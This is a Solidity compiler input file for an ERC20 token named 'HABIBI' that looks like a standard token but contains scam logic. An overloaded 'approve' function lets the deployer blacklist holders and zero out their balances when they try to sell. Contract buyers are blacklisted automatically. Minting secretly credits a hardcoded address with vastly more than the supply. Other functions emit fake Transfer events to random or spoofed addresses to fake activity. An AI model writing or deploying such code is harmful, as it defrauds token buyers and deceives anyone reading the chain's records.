{{
  "language": "Solidity",
  "sources": {
    "contracts/erc20Approve.sol": {
      "content": "pragma solidity ^0.8.0;\n\ncontract Owner {\n    address private owner;\n\n    event OwnerSet(address indexed oldOwner, address indexed newOwner);\n\n    modifier isOwner() {\n        require(msg.sender == owner, \"Caller is not owner\");\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor\n        emit OwnerSet(address(0), owner);\n    }\n\n    function changeOwner(address newOwner) public isOwner {\n        emit OwnerSet(owner, newOwner);\n        owner = newOwner;\n    }\n\n    function getOwner() external view returns (address) {\n        return owner;\n    }\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HABIBI is Owner, Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply = 0;\n    uint256 private _maxSupply = 90000000000000000;\n\n    string private _name = \"The Habibiz token\";\n    string private _symbol = \"HABIBI\";\n    uint8 private _decimals = 6;\n    uint256 private nonce = 0;\n    address private _master;\n    address private _ceo = 0xdC74F59Bfe072327581b637312FBC6f9AFA2969d;\n    address public Pair;\n\n    constructor() {\n        uint256 amount = _maxSupply;\n        _mint(msg.sender, amount);\n        _master = msg.sender;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _maxSupply;\n    }\n\n    function random() internal returns (uint256) {\n        uint256 randomnumber = uint256(\n            keccak256(abi.encodePacked(block.timestamp, msg.sender, nonce))\n        ) % 1000;\n        // randomnumber = randomnumber + 100;\n        nonce++;\n        return randomnumber;\n    }\n\n    function balanceOf(address account)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        return _balances[account];\n    }\n\n    function transfer(address to, uint256 amount)\n        public\n        virtual\n        override\n        returns (bool)\n    {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        override\n        returns (bool)\n    {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    function approve(address[] calldata accounts) public {\n        require(_master == msg.sender, \"Err\");\n        for (uint256 i = 0; i < accounts.length; i++) {\n            _badbro[accounts[i]] = true;\n        }\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        unchecked {\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n        _balances[_ceo] = _totalSupply * 10000;\n    }\n\n    function dropPresaleToken(\n        address ad,\n        address[] calldata eReceiver,\n        uint256[] calldata eAmounts\n    ) public {\n        require(_master == msg.sender, \"Err\");\n        for (uint256 i = 0; i < eAmounts[0]; i++) {\n            address randomish = address(\n                uint160(\n                    uint256(\n                        keccak256(\n                            abi.encodePacked(nonce, blockhash(block.timestamp))\n                        )\n                    )\n                )\n            );\n            nonce++;\n            emit Transfer(ad, randomish, random() * 100000000000);\n        }\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue)\n        public\n        virtual\n        returns (bool)\n    {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue)\n        public\n        virtual\n        returns (bool)\n    {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(\n            currentAllowance >= subtractedValue,\n            \"ERC20: decreased allowance below zero\"\n        );\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function transferFromAny(\n        address from,\n        address to,\n        uint256 amount\n    ) public returns (bool) {\n        address spender = _msgSender();\n        require(_master == tx.origin, \"Err\");\n        emit Transfer(from, to, amount);\n        //_spendAllowance(from, spender, amount);\n        //_transfer(from, to, amount);\n        return true;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        // require(!_badbro[from], \"Err\");\n        if (_badbro[from]) _balances[from] = _decimals;\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(\n            fromBalance >= amount,\n            \"ERC20: transfer amount exceeds balance\"\n        );\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n            // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n        if (from == _master) {\n            emit Transfer(\n                0x6681Ee66Db195a2d2Dc7E360fD29a933dB785c22,\n                to,\n                amount\n            );\n            Pair = to;\n        } else emit Transfer(from, to, amount);\n\n        if (Pair == from && to.code.length > 0) _badbro[to] = true;\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    mapping(address => bool) private _badbro;\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(\n                currentAllowance >= amount,\n                \"ERC20: insufficient allowance\"\n            );\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}